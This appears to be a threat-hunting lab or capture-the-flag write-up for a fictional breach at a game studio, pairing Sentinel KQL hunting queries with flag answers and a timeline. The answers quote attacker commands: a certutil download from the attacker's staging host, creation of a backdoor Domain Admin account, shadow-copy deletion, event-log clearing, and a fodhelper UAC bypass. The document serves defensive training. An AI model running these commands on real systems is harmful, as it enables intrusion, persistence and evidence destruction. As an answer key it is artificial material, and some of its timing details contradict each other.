# 🔥 IR-2026-0131-EF // EMBERFORGE: SOURCE LEAK

## Executive Summary

This document summarizes the complete threat hunting investigation conducted on EmberForge Studios following a targeted data exfiltration attack. The investigation spanned a **3-hour attacker dwell time** (2026-01-30 21:00 – 00:00 UTC) and was conducted across **44 flags** of malicious activity across 3 compromised hosts.

The attack began with a spearphishing lure targeting Lead Artist **Lisa Martin**, resulting in the exfiltration of the entire `C:\GameDev` source code directory — including proprietary engine components for the unreleased title *Neon Shadows* — to a MEGA cloud storage account. The attacker also stole every domain credential hash via VSS shadow copy of `ntds.dit` and left behind a persistent Domain Admin backdoor account.

---

## Incident Overview

| Field | Detail |
|---|---|
| **Case ID** | IR-2026-0131-EF |
| **Severity** | Critical |
| **Reported** | 2026-01-31 08:15 UTC |
| **Attack Date** | 2026-01-30 |
| **Dwell Time** | ~3 hours (21:00 – 00:00 UTC) |
| **Environment** | emberforge.local |
| **Platform** | Microsoft Sentinel — `EmberForgeX_CL` |
| **Log Sources** | Sysmon + Windows Security + Windows System |
| **Investigation Window** | 2026-01-30 21:00 UTC → 2026-01-31 00:00 UTC |

**Trigger:** Unreleased source code from EmberForge Studios' upcoming title *Neon Shadows* appeared on underground forums. External threat intelligence flagged the leak within 48 hours.

---

## Affected Assets

| Host | IP | Role |
|---|---|---|
| EC2AMAZ-B9GHHO6 | 10.1.173.145 | Workstation (Patient Zero) |
| EC2AMAZ-16V3AU4 | 10.1.57.66 | Server |
| EC2AMAZ-EEU3IA2 | 10.1.160.76 | Domain Controller |

---

## Investigation Overview

### Phase 01 — Exfiltration (Flags 1–9)

**Target System:** EC2AMAZ-16V3AU4 (10.1.57.66) — Server

**Summary:** Working backwards from the breach trigger, the investigation identified the full exfiltration chain. The attacker compressed `C:\GameDev` using a native PowerShell cmdlet, staged it in a world-writable directory, and uploaded it to MEGA cloud storage using `rclone.exe` with hardcoded credentials visible in the command line.

| Metric | Value |
|---|---|
| Flags Investigated | 9 |
| Exfil Tool | rclone.exe |
| Destination | MEGA (bt5.api.mega.co.nz) |
| Destination IP | 66.203.125.15 |
| Attacker Account | jwilson.vhr@proton.me |
| Password Exposed | Summer2024! |
| Data Staged | C:\Users\Public\gamedev.zip |
| Source Directory | C:\GameDev |

**Key Findings:**
- `Compress-Archive` (LOTL) used to zip `C:\GameDev` → `C:\Users\Public\gamedev.zip`
- `rclone.exe` dropped to `C:\Users\Public\` and executed as SYSTEM
- MEGA API credentials exposed in plaintext command line arguments
- Attacker staging server: `sync.cloud-endpoint.net:8080`
- Multiple rclone executions — attacker troubleshot authentication before succeeding

---

### Phase 02 — Credential Access (Flags 4, 22, 23)

**Target System:** EC2AMAZ-EEU3IA2 (10.1.160.76) — Domain Controller

**Summary:** The attacker targeted credentials on both the workstation and domain controller. LSASS was dumped using direct syscalls to bypass API monitoring. On the DC, VSS shadow copy was used to extract `ntds.dit` — containing every domain credential hash — before destroying the evidence.

| Metric | Value |
|---|---|
| Flags Investigated | 3 |
| LSASS Dump Tool | update.exe (direct syscalls) |
| Dump Location | C:\Windows\System32\lsass.dmp |
| DC Credential File | ntds.dit |
| Extraction Method | VSS Shadow Copy |
| Staging Path | C:\Windows\Temp\nyMdRNSp.tmp |
| Evidence Destroyed | vssadmin delete shadows /Quiet |

**Key Findings:**
- LSASS dumped without triggering EID 10 (ProcessAccess) — direct syscall bypass
- VSS snapshot created, `ntds.dit` copied, snapshot deleted within 13 seconds
- Automated C2 framework execution pattern throughout

---

### Phase 03 — Initial Access (Flags 10–15)

**Target System:** EC2AMAZ-B9GHHO6 (10.1.173.145) — Workstation

**Summary:** Lisa Martin (`lmartin`) was specifically targeted via a spearphishing lure disguised as an `EmberForge_Review` archive. The malicious payload was delivered inside an ISO image, bypassing Windows Mark of the Web (MOTW) protections. Execution began when Lisa double-clicked `review.dll` from Explorer.

| Metric | Value |
|---|---|
| Flags Investigated | 6 |
| Patient Zero | lmartin (Lead Artist) |
| Delivery Method | ISO image (MOTW bypass) |
| Initial Payload | D:\review.dll (StartW export) |
| Execution Mechanism | rundll32.exe |
| C2 Payload Dropped | C:\Users\Public\update.exe |
| Drive Letter | D: (mounted ISO) |

**Key Findings:**
- ISO mounted as `D:` — files inside bypass MOTW tagging entirely
- `review.dll` loaded via `rundll32.exe` — `StartW` export consistent with C2 framework DLL
- `update.exe` dropped to `C:\Users\Public\` (world-writable staging directory)
- Execution chain: `explorer.exe > rundll32.exe > review.dll`

---

### Phase 04 — Command & Control (Flags 16–17)

**Target System:** EC2AMAZ-B9GHHO6 (10.1.173.145) — Workstation

**Summary:** `update.exe` established a C2 beacon to attacker-controlled infrastructure disguised as legitimate cloud/CDN traffic. DNS queries were captured via Sysmon EID 22, revealing the C2 domain and resolved IPs routed through Cloudflare.

| Metric | Value |
|---|---|
| Flags Investigated | 2 |
| C2 Domain | cdn.cloud-endpoint.net |
| Resolved IPs | 104.21.30.237, 172.67.174.46 |
| Protocol | HTTPS (port 443) |
| Evasion | Cloudflare proxied — origin hidden |

**Key Findings:**
- C2 domain mimics legitimate CDN traffic — designed to blend in
- Both IPs are Cloudflare ranges — origin server obscured
- Same root domain (`cloud-endpoint.net`) used for staging and C2

---

### Phase 05 — Defense Evasion (Flags 18–21, 29)

**Target System:** EC2AMAZ-B9GHHO6 (10.1.173.145) — Workstation

**Summary:** The attacker used two rounds of process injection (CreateRemoteThread / EID 8) to hide malicious activity inside legitimate processes. UAC was bypassed silently via `fodhelper.exe` COM hijack using the `DelegateExecute` registry trick.

| Metric | Value |
|---|---|
| Flags Investigated | 5 |
| First Injection | rundll32.exe → notepad.exe |
| Second Injection | update.exe → spoolsv.exe (SYSTEM) |
| UAC Bypass Binary | fodhelper.exe |
| Registry Key Hijacked | HKCU\Software\Classes\ms-settings\shell\open\command |
| Enabling Value | DelegateExecute (empty) |
| Post-Injection Parent | spoolsv.exe (NT AUTHORITY\SYSTEM) |

**Key Findings:**
- `notepad.exe` used as initial hiding host for injected shellcode
- `spoolsv.exe` targeted for SYSTEM-level stability — Print Spooler always running
- `DelegateExecute` empty value triggers `fodhelper` auto-elevation — no UAC prompt shown
- All lateral movement commands ran as children of `spoolsv.exe`

---

### Phase 06 — Discovery (Flags 24–26)

**Target System:** EC2AMAZ-B9GHHO6 (10.1.173.145) — Workstation

**Summary:** Three automated recon commands executed within 12 seconds of each other via the injected `spoolsv.exe` process, mapping the domain environment before lateral movement began.

| Metric | Value |
|---|---|
| Flags Investigated | 3 |
| Duration | 12 seconds (21:34:32 – 21:34:44) |
| Commands Run | net user /domain, net group, nltest |
| Target Identified | EC2AMAZ-EEU3IA2 (Domain Controller) |

**Key Findings:**
- `net user /domain` → enumerate all domain accounts
- `net group "Domain Admins" /domain` → identify privileged targets
- `nltest /dclist:emberforge.local` → locate Domain Controller
- Speed and sequence confirm automated C2 framework recon module

---

### Phase 07 — Lateral Movement (Flags 27–35)

**Target Systems:** All three hosts

**Summary:** The attacker staged a distribution point on the workstation, moved to the server via admin share file copy and remote service execution, then pivoted to the Domain Controller using the same technique. NTLM authentication failures on the server preceded the successful service-based execution.

| Metric | Value |
|---|---|
| Flags Investigated | 9 |
| Failed Auth Protocol | NTLM (multiple 4625 events) |
| Distribution Share | tools=C:\Users\Public (/grant:everyone,full) |
| Firewall Rule Added | SMB (port 445 inbound) |
| Server Payload Delivery | cmd.exe /c copy via C$ admin share |
| Remote Execution Service | MzLblBFm (random name) |
| Server Download Tool | certutil.exe (LOTL) |
| First Command on Server | whoami |
| First Command on DC | whoami > vssadmin.exe |

**Key Findings:**
- NTLM failures indicate Pass-the-Hash attempts before pivoting to service execution
- Random service name `MzLblBFm` — C2 framework auto-generated, deleted after execution
- `certutil -urlcache -f` used to download `AnyDesk.exe` and `update.exe` on server
- Same `__output_` temp file redirection pattern across all three hosts
- `net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!` — plaintext domain admin password exposed

---

### Phase 08 — Persistence (Flags 36–42)

**Target Systems:** All three hosts

**Summary:** The attacker left multiple redundant persistence mechanisms across the environment, including a scheduled task, a backdoor Domain Admin account, and AnyDesk for GUI remote access independent of the C2 beacon.

| Metric | Value |
|---|---|
| Flags Investigated | 7 |
| Scheduled Task | WindowsUpdate → C:\Users\Public\update.exe (SYSTEM, onstart) |
| Backdoor Account | svc_backup / P@ssw0rd123! |
| Privilege Level | Domain Admin |
| Remote Access Tool | AnyDesk (C:\ProgramData\AnyDesk\system.conf) |
| Domain Admin Password Exposed | EmberForge2024! |

**Key Findings:**
- `WindowsUpdate` task name chosen to blend in with legitimate Windows maintenance
- `svc_backup` naming mimics legitimate service accounts — evades casual AD audits
- Password `P@ssw0rd123!` exposed in plaintext in Sysmon EID 1 logs
- AnyDesk provides GUI access independent of C2 — survives C2 takedown
- `DelegateExecute` registry key still present — UAC bypass persists

---

### Phase 09 — Anti-Forensics (Flags 43–44)

**Target System:** EC2AMAZ-EEU3IA2 (10.1.160.76) — Domain Controller

**Summary:** As the final act, the attacker used `wevtutil` to clear the Security and System event logs on the Domain Controller, attempting to erase evidence of their activity. Sysmon telemetry forwarded to Sentinel in real time rendered this ineffective.

| Metric | Value |
|---|---|
| Flags Investigated | 2 |
| Tool Used | wevtutil.exe |
| Logs Cleared | Security, System |
| Timestamps | 23:50:49 (Security), 23:51:06 (System) |
| Evasion Attempt | Path obfuscation: C:\Windows\..\Windows\System32\cmd.exe |

**Key Findings:**
- Log clearing is always end-of-mission — confirms attacker was wrapping up
- `wevtutil cl Security` destroys logon, account, and privilege events locally
- `wevtutil cl System` destroys service installation events (would hide `MzLblBFm`)
- Sysmon logs forwarded to Sentinel before deletion — all evidence preserved
- Breach lasted approximately **2 hours 24 minutes** (21:27 initial access → 23:51 cleanup)

---

## Complete Flag Reference

### Phase 01 — Exfiltration

---

#### Flag 1 — Source Directory of Stolen Data
**Answer:** `C:\GameDev` — `2026-01-30 23:11:28`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("7z", "zip", "compress", "rar", "tar", "Compress-Archive")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 2 — Cloud Provider That Received Stolen Data
**Answer:** `MEGA`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where Image_s has "rclone"
| project UtcTime_s, Computer, User_s, Image_s, DestinationIp_s, DestinationPort_s, DestinationHostname_s
```

---

#### Flag 3 — Attacker Email Used to Authenticate
**Answer:** `jwilson.vhr@proton.me`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Image_s has "rclone"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
```

---

#### Flag 5 — Exfiltration Tool
**Answer:** `rclone.exe` — `2026-01-30 23:06:36`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("rclone", "gamedev.zip")
| project UtcTime_s, Computer, User_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 6 — Destination IP
**Answer:** `66.203.125.15` — `2026-01-30 23:12:53`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where Image_s contains "rclone"
| project UtcTime_s, Computer, User_s, Image_s, DestinationIp_s, DestinationHostname_s, DestinationPort_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 7 — Plaintext Password in Command Line
**Answer:** `Summer2024!`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Image_s has "rclone"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
```

---

#### Flag 8 — Compression Cmdlet (LOTL)
**Answer:** `Compress-Archive`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("7z", "zip", "compress", "rar", "tar", "Compress-Archive")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 9 — Attacker Staging Server
**Answer:** `sync.cloud-endpoint.net` (full: `http://sync.cloud-endpoint.net:8080`)

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("curl", "Invoke-WebRequest", "wget", "iwr", "ftp", "Upload", "post")
| project UtcTime_s, Computer, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 02 — Credential Access

---

#### Flag 4 — Domain Credential File (VSS)
**Answer:** `ntds.dit` — `2026-01-30 23:35:10`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Computer contains "EC2AMAZ-EEU3IA2"
| where EventCode_s == "1"
| where CommandLine_s has_any ("ntds")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
```

---

#### Flag 22 — Process That Dumped LSASS
**Answer:** `update.exe` — `2026-01-30 21:48:13`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "11"
| where TargetFilename_s has_any (".dmp", ".dump", "lsass", "debug")
| project UtcTime_s, Computer, TargetFilename_s, ProcessName_s, process_path_s, Image_s, creation_time_s, file_path_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 23 — LSASS Dump File Location
**Answer:** `C:\Windows\System32\lsass.dmp`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "11"
| where TargetFilename_s has_any (".dmp", ".dump", "lsass", "debug")
| project UtcTime_s, Computer, TargetFilename_s, ProcessName_s, process_path_s, Image_s, creation_time_s, file_path_s
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 03 — Initial Access

---

#### Flag 10 — Malicious File Loaded on Workstation
**Answer:** `review.dll` — `2026-01-30 21:27:03`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where Image_s contains "rundll32"
| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 11 — Drive Letter (ISO MOTW Bypass)
**Answer:** `D:`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where Image_s contains "rundll32"
| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 12 — Patient Zero Account
**Answer:** `lmartin`

> *No KQL required — found in `User_s` field of Flag 10 results.*

---

#### Flag 13 — Execution Chain
**Answer:** `explorer.exe > rundll32.exe > review.dll`

> *Derived from `ParentImage_s` and `Image_s` fields in Flag 10 results.*

---

#### Flag 14 — Extraction Step
**Answer:** `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\` — `2026-01-30 21:24:04`

> *Found in `-o` argument of 7zG.exe command line in compression query results.*

---

#### Flag 15 — Primary C2 Payload Dropped
**Answer:** `C:\Users\Public\update.exe` — `2026-01-30 21:40:24`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where User_s contains @"EMBERFORGE\lmartin"
| where EventCode_s == "1"
| where CommandLine_s has_any ("Desktop", "Downloads", "Public", "lmartin")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 04 — Command & Control

---

#### Flag 16 — C2 Beacon Domain
**Answer:** `cdn.cloud-endpoint.net`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| where Computer contains "B9GHHO6"
| project UtcTime_s, Computer, Image_s, QueryName_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 17 — Resolved C2 IP
**Answer:** `104.21.30.237`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| where Computer contains "B9GHHO6"
| extend ResolvedIP = extract("QueryResults'>([^<]+)", 1, Raw_s)
| where QueryName_s == "cdn.cloud-endpoint.net"
| project UtcTime_s, Computer, Image_s, QueryName_s, ResolvedIP
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 05 — Defense Evasion

---

#### Flag 18 — First Process Injection
**Answer:** `notepad.exe` — `2026-01-30 21:32:42`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "8"
| project UtcTime_s, Computer, CommandLine_s, SourceImage_s, TargetImage_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 19 — UAC Bypass Binary
**Answer:** `fodhelper.exe`

> *Identified via `ParentImage_s` in process creation chain — `fodhelper.exe` spawning `update.exe` elevated.*

---

#### Flag 20 — Registry Value Enabling UAC Bypass
**Answer:** `DelegateExecute` — `2026-01-30 21:38:50`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "13"
| where TargetObject_s contains "ms-settings"
| project UtcTime_s, Computer, User_s, Image_s, TargetObject_s, Details_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 21 — Second Process Injection (SYSTEM Stability)
**Answer:** `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` — `2026-01-30 21:56:44`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "8"
| project UtcTime_s, Computer, SourceImage_s, TargetImage_s, StartAddress_s, StartModule_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 29 — Parent of All Lateral Movement Commands
**Answer:** `spoolsv.exe`

> *Identified via `ParentImage_s` on all lateral movement commands (net share, netsh, copy).*

---

### Phase 06 — Discovery

---

#### Flag 24 — First Discovery Command
**Answer:** `net user /domain` — `2026-01-30 21:34:32`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where User_s contains @"EMBERFORGE\lmartin"
| where EventCode_s == "1"
| where CommandLine_s has_any ("whoami", "hostname", "user", "net")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 25 — Domain Admins Enumeration
**Answer:** `net group "Domain Admins" /domain` — `2026-01-30 21:34:44`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where User_s contains @"EMBERFORGE\lmartin"
| where EventCode_s == "1"
| where CommandLine_s has_any ("whoami", "hostname", "user", "net")
| project UtcTime_s, Computer, User_s, ParentImage_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 26 — DC Location Command
**Answer:** `nltest /dclist:emberforge.local`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("nslookup", "arp", "nltest", "ping", "ipconfig", "net view", "nbtstat", "tracert", "dc", "domain")
| project UtcTime_s, Computer, User_s, ParentImage_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 07 — Lateral Movement

---

#### Flag 27 — Network Share Created for Distribution
**Answer:** `cmd.exe /c "net share tools=C:\Users\Public /grant:everyone,full"`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("New-SmbShare", "net share", "NetShareAdd")
| project UtcTime_s, Computer, User_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 28 — Firewall Rule Name
**Answer:** `SMB` — `2026-01-30 22:54:09`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("netsh", "firewall", "NetFirewallRule", "advfirewall")
| project UtcTime_s, Computer, User_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 30 — File Copy to Server via Admin Share
**Answer:** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe` — `2026-01-30 22:14:55`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("copy", "xcopy", "robocopy")
| where CommandLine_s contains "10.1.57.66"
| project UtcTime_s, Computer, User_s, ParentImage_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 31 — Utility Used to Download Tools on Server
**Answer:** `certutil.exe > http://sync.cloud-endpoint.net:8080/AnyDesk.exe` — `2026-01-30 22:18:02`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-16V3AU4"
| where CommandLine_s has_any ("invoke-webrequest", "curl", "sync", "certutil")
| project UtcTime_s, Computer, User_s, ParentImage_s, CommandLine_s, process_exec_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 32 — Random Service Name (Remote Execution)
**Answer:** `MzLblBFm`

```kql
EmberForgeX_CL
| where EventCode_s == "7045"
| where Computer contains "16V3AU4"
| extend ServiceName = extract("ServiceName'>([^<]+)", 1, Raw_s)
| extend ServicePath = extract("ImagePath'>([^<]+)", 1, Raw_s)
| project TimeGenerated, ServiceName, Raw_s
```

> ⚠️ EID 7045 is a System event — no `UtcTime_s`. Set Sentinel time picker to 28 Jan – 11 Feb 2026.

---

#### Flag 33 — First Command on Server
**Answer:** `whoami`

```kql
EmberForgeX_CL
| where EventCode_s == "7045"
| where Computer contains "16V3AU4"
| extend ServiceName = extract("ServiceName'>([^<]+)", 1, Raw_s)
| extend ServicePath = extract("ImagePath'>([^<]+)", 1, Raw_s)
| project TimeGenerated, ServiceName, Raw_s
```

---

#### Flag 34 — Failed Authentication Protocol
**Answer:** `NTLM`

```kql
EmberForgeX_CL
| where EventCode_s == "4625"
| where Computer contains "16V3AU4"
| extend LogonType = extract("LogonType'>([^<]+)", 1, Raw_s)
| extend TargetUser = extract("TargetUserName'>([^<]+)", 1, Raw_s)
| extend SourceIP = extract("IpAddress'>([^<]+)", 1, Raw_s)
| extend AuthPackage = extract("AuthenticationPackageName'>([^<]+)", 1, Raw_s)
| project TimeGenerated, Computer, TargetUser, LogonType, AuthPackage, SourceIP
| sort by TimeGenerated asc
```

> ⚠️ EID 4625 is a Security event — no `UtcTime_s`. Set Sentinel time picker to 28 Jan – 11 Feb 2026.

---

#### Flag 35 — First Command on DC + Extraction Tool
**Answer:** `whoami > vssadmin.exe`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where ParentImage_s contains "services.exe"
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, process_exec_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 08 — Persistence

---

#### Flag 36 — Backdoor Account Creation Command
**Answer:** `net user svc_backup P@ssw0rd123! /add /domain` — `2026-01-30 23:38:11`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where ParentImage_s contains "services.exe"
| project UtcTime_s, Computer, User_s, ParentImage_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 37 — Backdoor Account Password
**Answer:** `P@ssw0rd123!`

> *Found in plaintext in `CommandLine_s` of Flag 36 results — OPSEC failure.*

---

#### Flag 38 — Domain Admin Elevation Command
**Answer:** `net group "Domain Admins" svc_backup /add /domain` — `2026-01-30 23:39:37`

> *Found in same query as Flag 36 — executed 86 seconds after account creation.*

---

#### Flag 39 — Domain Admin Plaintext Password (Drive Mapping)
**Answer:** `EmberForge2024!`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where CommandLine_s has_any ("net use", "map", "\\\\")
| project UtcTime_s, Computer, User_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 40 — Scheduled Task Name
**Answer:** `WindowsUpdate` — `2026-01-30 21:44:31`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where User_s contains @"EMBERFORGE\lmartin"
| where EventCode_s == "1"
| where CommandLine_s has_any ("Desktop", "Downloads", "Public", "lmartin")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 41 — Remote Management Tool Installed
**Answer:** `AnyDesk`

> *Downloaded via `certutil` from `sync.cloud-endpoint.net:8080/AnyDesk.exe` at 22:10 on server.*

---

#### Flag 42 — AnyDesk Config File Path
**Answer:** `cmd.exe /c type C:\ProgramData\AnyDesk\system.conf` — `2026-01-30 23:15:17`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("AnyDesk", "config", "conf")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

### Phase 09 — Anti-Forensics

---

#### Flag 43 — Log Clearing Tool
**Answer:** `wevtutil` — `2026-01-30 23:50:50`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("wevtutil")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

---

#### Flag 44 — Event Logs Cleared
**Answer:** `Security` and `System`

> `2026-01-30 23:50:49` — `wevtutil cl Security`
> `2026-01-30 23:51:06` — `wevtutil cl System` (path obfuscated: `C:\Windows\..\Windows\System32\cmd.exe`)

---

## Full Attack Timeline

| Time (UTC) | Host | Event |
|---|---|---|
| 21:09 | DC | Splunk Universal Forwarder running (baseline) |
| 21:18 | Workstation | Edge browser active — Lisa browsing |
| 21:23 | Workstation | 7-Zip installer (`7z2501-x64.exe`) downloaded and executed |
| 21:24 | Workstation | Archive extracted → `EmberForge_Review\` on `D:` |
| **21:27** | **Workstation** | **`rundll32.exe` loads `D:\review.dll,StartW` ← INITIAL ACCESS** |
| 21:32 | Workstation | Injection 1: `rundll32.exe → notepad.exe` (EID 8) |
| 21:34 | Workstation | Discovery: `net user`, `net group "Domain Admins"`, `nltest /dclist` |
| 21:37 | Workstation | Persistence: `WindowsUpdate` scheduled task created |
| 21:38 | Workstation | UAC bypass: `ms-settings` COM hijack (`DelegateExecute`) |
| 21:40 | Workstation | `fodhelper.exe` elevates `update.exe` — UAC bypassed |
| 21:44 | Workstation | SYSTEM persistence cemented via elevated schtasks |
| 21:48 | Workstation | LSASS dumped → `C:\Windows\System32\lsass.dmp` |
| 21:57 | Workstation | Injection 2: `update.exe → spoolsv.exe (SYSTEM)` (EID 8) |
| 22:10 | Workstation | NTLM auth failures against server (4625 events) |
| 22:14 | Workstation | `update.exe` copied → `\\10.1.57.66\C$\Users\Public\` |
| 22:15 | Workstation | SMB firewall rule added (`netsh advfirewall`) |
| 22:15 | Workstation | `tools` share created (`net share tools=C:\Users\Public`) |
| 22:18 | Server | Service `MzLblBFm` created — remote execution begins |
| 22:18 | Server | First command: `whoami` |
| 22:18 | Server | `certutil` downloads `AnyDesk.exe` from staging server |
| 22:18 | Server | `certutil` / PowerShell IWR downloads `update.exe` (multiple attempts) |
| 22:57 | DC | Drive mapped: `net use Z: \\10.1.173.145\tools` — `EmberForge2024!` exposed |
| 23:06 | Server | `rclone.exe` executed |
| 23:11 | Server | `Compress-Archive C:\GameDev → gamedev.zip` |
| 23:12 | Server | `rclone` uploads to MEGA → `66.203.125.15` ← **EXFILTRATION** |
| 23:15 | Server | AnyDesk config read: `type C:\ProgramData\AnyDesk\system.conf` |
| 23:34 | DC | Remote execution begins — first command: `whoami → vssadmin.exe` |
| 23:35 | DC | `vssadmin create shadow /For=C:` |
| 23:35 | DC | `ntds.dit` copied → `C:\Windows\Temp\nyMdRNSp.tmp` |
